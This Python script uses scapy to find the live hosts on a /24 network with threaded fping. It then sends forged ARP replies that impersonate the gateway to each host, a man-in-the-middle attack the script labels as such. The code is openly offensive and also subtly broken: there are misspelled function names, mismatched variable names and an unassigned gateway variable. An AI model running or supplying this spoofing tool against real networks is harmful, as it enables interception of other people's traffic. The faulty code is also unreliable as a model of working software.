from scapy.all import *
from threading import *
import optparse
import time
import subprocess
import queue



MAX_PINGERS = 4
TIMEOUT     = 300


def netScan(network):
    global MAX_PINGERS
    address_queue = queue.Queue()
    upIPs = []
    for host in range(1, 255):
        address_queue.put(network + '.' + str(host))
    pingers = [Thread(target=IPscan, args=(address_queue, upIPs)) for _ in range(MAX_PINGERS)]

    for pinger in pingers:
        pinger.start()
    
    for pinger in pingers:
        pinger.join()

    return upIPs

def IPscan(toPingQueue, upIPs):
    """
    Pings to IPs on the ping Queue.    
    """
    global TIMEOUT
    try:
        while True:
            address = toPingQueue.get_nowait()
            exitStatus = subprocess.call(['fping', '-c', '1', '-t', str(TIMEOUT), address], \
                    stdout=subprocess.DEVNULL, \
                    stderr=subprocess.DEVNULL)
            if exitStatus == 0:
                # print("[+]", address, "up")
                upIPs.append(address)

    except queue.Empty:
        pass

def getMAC(ip):
    """
    Sends an ARP req. (op code 1). The hwdst must be all f's (bcast). The
    pdst is the IP you're asking for.
    """
    resp = sr1(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip), \
            retry=2, timeout=10, verbose=False)
    if resp[ARP].hwsrc:
        return resp[ARP].hwsrc
    return None

def arpSpoof(gwIP, gwMAC, tgtIp, tgtMAC):
    print("[*] Starting ARP spoofing [Ctrl-C to stop]")
    try:
        send(ARP(op=2, pdst=tgtIP, hwdst=tgtMAC, psrc=gwIP) , verbose=False)
       #send(ARP(op=2, pdst=gwIP , hwdst=gwMAC , psrc=tgtIP), verbose=False) # -> Creates MIT, verbose=FalseM # -> Creates MITM 
        time.sleep(2)
    except:
        pass

def main():
    parser = optparse.OptionParser("Usage: pyhon3 %prog " + \
            "-n <target network> -g <gateway IP> -t <threads>")

    parser.addOption('-n', dest='tgtNet' , type='string', help='specify target network')
    parser.addOption('-g', dest='gwIP'   , type='string', help='specify gateway IP')
    parser.addOption('-t', dest='threads', type='int'   , help='specify number of threads [default: 4]')

    (options, args) = parser.parse_args()


    if options.threads != None:
        MAX_PINGERS = options.threads
    if (options.tgtNet == None) or (gwIP == None):
        print(parser.usage)
        exit(1)
    else:
        tgtNet = options.tgtNet
        gwIP   = options.gwIP

    gwMAC = getMaC(gwIP)
    if gwMAC == None:
        print("[!] Unable to get gateway MAC.")

    print("[+] Retrieving connected devices")
    pingableIPs = netScan(tgtNet)
    
    print("[+] Spoofing connected devices")
    for device in pingableIPs:
        tgtMAC = getMAC(device)
        if tgtMAC == None:
            pass
        else:
            arpSpoof(gwIP, gwMAC, device, tgtMAC)

